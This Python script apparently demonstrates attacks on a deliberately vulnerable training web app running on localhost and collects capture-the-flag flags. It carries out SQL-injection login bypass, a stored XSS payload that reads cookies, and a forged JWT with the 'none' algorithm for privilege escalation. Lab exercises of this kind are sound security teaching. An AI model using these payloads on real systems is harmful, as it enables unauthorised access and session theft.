#!/usr/bin/env python3
import requests
import json
import jwt
import base64
import sys
import time

# Configuration
BASE_URL = 'http://127.0.0.1:5000'
ADMIN_CREDS = {'username': 'admin', 'password': 'admin123'}

def print_header():
    print("AWAS Project - Core Vulnerability Exploitation Demo")
    print("===============================================")
    print("This script demonstrates the three main vulnerabilities:")
    print("1. SQL Injection - Authentication Bypass")
    print("2. Stored XSS - Cross-Site Scripting Attack")
    print("3. JWT None Algorithm - Privilege Escalation\n")
    print("Starting exploitation...\n")

def exploit_sql_injection():
    print("1. SQL Injection Exploit (Authentication Bypass)")
    print("----------------------------------------------")
    
    # SQL Injection payload: ' OR '1'='1' --
    payload = {"username": "' OR '1'='1' --", "password": "anything"}
    response = requests.post(f"{BASE_URL}/login", data=payload)
    
    if "FLAG{" in response.text:
        flag = response.text[response.text.find("FLAG{"):].split("}")[0] + "}"
        print("✓ SQL Injection successful!")
        print(f"Flag found: {flag}")
    else:
        print("× SQL Injection failed")
        print("Response:", response.text[:100], "\n")

def exploit_stored_xss():
    print("2. Stored XSS Exploit (Cross-Site Scripting)")
    print("-------------------------------------------")
    
    # First login as admin
    session = requests.Session()
    session.post(f"{BASE_URL}/login", data=ADMIN_CREDS)
    
    # Create a post with XSS payload
    xss_payload = {
        'title': 'Test Post',
        'content': '<script>alert(document.cookie)</script>',
        'private': '0'
    }
    
    response = session.post(f"{BASE_URL}/dashboard", data=xss_payload)
    
    if "FLAG{" in response.text:
        flag = response.text[response.text.find("FLAG{"):].split("}")[0] + "}"
        print("✓ XSS payload injected successfully!")
        print(f"Flag found: {flag}")
        print("Note: In a real attack, the attacker would wait for an admin to view the post")
        print("      to steal their session cookie.")
    else:
        print("× XSS injection failed")
        print("Response:", response.text[:100])
    print()

def exploit_jwt_none():
    print("3. JWT None Algorithm Exploit (Privilege Escalation)")
    print("------------------------------------------------")
    
    # Create a JWT token with 'none' algorithm
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    payload = {
        "role": "admin",
        "username": "attacker"
    }
    
    # Encode header and payload
    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    
    # Create token with empty signature
    token = f"{header_encoded}.{payload_encoded}."
    
    # Send request with the forged token
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(f"{BASE_URL}/api/secret", headers=headers)
    
    try:
        json_response = response.json()
        if 'flag' in json_response:
            print("✓ JWT None algorithm exploit successful!")
            print(f"Flag found: {json_response['flag']}")
        else:
            print("× JWT None algorithm exploit failed")
            print("Response:", json.dumps(json_response, indent=2))
    except:
        print("× JWT None algorithm exploit failed")
        print("Response:", response.text[:500])
    print("\n")

def main():
    print_header()
    
    try:
        exploit_sql_injection()
        exploit_stored_xss()
        exploit_jwt_none()
        
        print("All exploits completed!")
        print("Try them manually in the browser for better understanding.")
        print("Remember to look for the hidden flags in the page source when successful.")
        
    except requests.exceptions.ConnectionError:
        print("Error: Could not connect to the server.")
        print("Make sure the Flask application is running on http://127.0.0.1:5001")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()